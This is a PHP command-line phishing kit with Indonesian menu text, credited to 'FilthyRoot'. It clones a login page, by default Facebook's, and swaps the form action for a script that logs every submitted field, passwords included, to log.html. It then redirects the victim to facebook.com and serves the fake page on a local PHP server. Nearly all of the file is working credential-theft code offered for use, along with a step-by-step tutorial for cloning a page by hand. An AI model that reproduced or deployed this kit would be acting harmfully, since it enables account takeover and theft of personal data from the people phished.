<?php
error_reporting(0);
/*http://203.153.20.184/getpage.gch?pid=1002&nextpage=sec_sc_t.gch*/
function parse(){
  $c=file_get_contents("cache.html");
  $x=explode("\n",$c);
  foreach ($x as $xx => $xxx){
    if(preg_match('/action="/',$xxx) && preg_match('/form/',$xxx) && preg_match('/<input/',$xxx)){
      $z=explode('</div>',$xxx);
      foreach($z as $zz){
        if(preg_match('/type="submit"/',$zz)){
          $z1=explode('action="',$zz);
          foreach($z1 as $z11){
            if(preg_match('/method/',$z11)){
              $z2=explode('"',$z11);
              $z3=str_replace($z2['0'],'terpancynk_v1.php',$c);
              if(!file_exists('data/')){
                mkdir('data');
              }
              $fh=fopen('data/index.html','w');
              fwrite($fh,$z3);
              fclose($fh);
              echo "[+] Creating phising script ...\n";
              sleep(1);
              $content='<?php
              header(\'Location:http://facebook.com\');
              $fh=fopen(\'log.html\',\'a\');
              fwrite($fh,"<b>[+] NEW LOGIN [+]</b><br>");
              foreach($_POST as $variable => $value){
                fwrite($fh,"$variable = $value<br>");
              }
              fwrite($fh,"<hr size=\'1\'>");
              exit;
              ?>';
              $fh2=fopen('data/terpancynk_v1.php','w');
              fwrite($fh2,$content);
              fclose($fh);
              echo "[+] Success at data/index.html\n";
              sleep(1);
              clear();
              ban();
              menu();
            }
          }
        }
      }
    }
  }
}
function request($url){
  $useragent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/52.0";  //ganti aje
  $ch=curl_init();
  curl_setopt($ch, CURLOPT_URL, "http://$url");
  curl_setopt($ch, CURLOPT_USERAGENT, "$useragent");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
  $z=curl_exec($ch);
  curl_close($ch);
  return $z;
}
function clear(){
  system('clear');
}
clear();
function ban(){
echo "
╔╦╗┌─┐┬─┐┌─┐┌─┐┌┐┌┌─┐┬ ┬┌┐┌┬┌─   Original Code By
 ║ ├┤ ├┬┘├─┘├─┤││││  └┬┘│││├┴┐      FilthyRoot
 ╩ └─┘┴└─┴  ┴ ┴┘└┘└─┘ ┴ ┘└┘┴ ┴ \n";
}
 function menu(){
 echo "
 1. Get Script.
 2. Auto Parse Script. [For facebook only]
 3. Manual Parse.
 4. Start Listener.
 5. Add Terpancynk Script.\n => ";
 $opt=trim(fgets(STDIN));
if($opt == 1){
clear();
ban();
echo "[?] Url : http://";
$url=trim(fgets(STDIN));
$x=request($url);
$fh=fopen("cache.html","w");
fwrite($fh,$x);
fclose($fh);
echo "[+] Success at cache.html\n";
sleep(1);
clear();
ban();
menu();
}elseif($opt == 2){
  clear();
  ban();
  parse();
}elseif($opt == 4){
  clear();
  ban();
  echo "[?] Port : ";
  $port=trim(fgets(STDIN));
  echo "[+] Listening at port $port ...\n";
  echo "[+] Now open http://127.0.0.1:$port at your browser!\n";
  echo "[+] Result : http://127.0.0.1:$port/log.html\n";
  sleep(2);
  system('php -S 0.0.0.0:'.$port.' -t data/');
}elseif($opt == 3){
  clear();
  ban();
  echo "
Tutorial untuk Manual Parse :

1. Pilih opsi 1 untuk mendapat konten login page.
2. Akan muncul file cache.html
3. Cari kata 'action' pada tag <form> dan ganti valuenya dengan 'terpancynk_v1.php'
4. Save as index.html dan pindahkan ke folder data/
5. Pada opsi menu pilih no. 5 (add terpancynk script).

[?] Done?(y/n) : ";
  $opt2=trim(fgets(STDIN));
  if($opt2==y){
    clear();
    ban();
    menu();
  }else{
    clear();
    ban();
    menu();
  }
}elseif($opt == 5){
  $content='<?php
  header(\'Location:http://facebook.com\');
  $fh=fopen(\'log.html\',\'a\');
  fwrite($fh,"<b>[+] NEW LOGIN [+]</b><br>");
  foreach($_POST as $variable => $value){
    fwrite($fh,"$variable = $value<br>");
  }
  fwrite($fh,"<hr size=\'1\'>");
  exit;
  ?>';
  $fh2=fopen('data/terpancynk_v1.php','w');
  fwrite($fh2,$content);
  fclose($fh);
  echo "[+] Success at data/terpancynk_v1.php !";
  sleep(1);
  clear();
  ban();
  menu();
}
  else{
  exit();
}
}
ban();
menu();
?>
